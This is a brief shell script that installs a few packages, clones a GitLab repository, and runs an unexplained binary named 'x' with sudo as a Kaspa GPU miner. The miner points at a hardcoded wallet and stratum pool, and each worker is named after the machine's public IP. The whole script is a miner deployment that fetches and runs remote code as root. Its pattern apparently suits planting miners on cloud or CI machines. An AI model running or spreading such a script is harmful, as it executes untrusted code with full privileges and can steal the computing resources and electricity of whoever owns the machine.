#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS er.sh 65 75
sudo git clone https://gitlab.com/hadiwkwkwkhadi/mabor
cd mabor
chmod +x x
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a kaspa -w qrd5tt3vujdf76yxucs5ena0dj4y5ctdqcn55gznwpe366k8da3gc6j5qrx0m -p stratum+tcp://acc-pool.pw:16061 -r $ip --nvidia 1
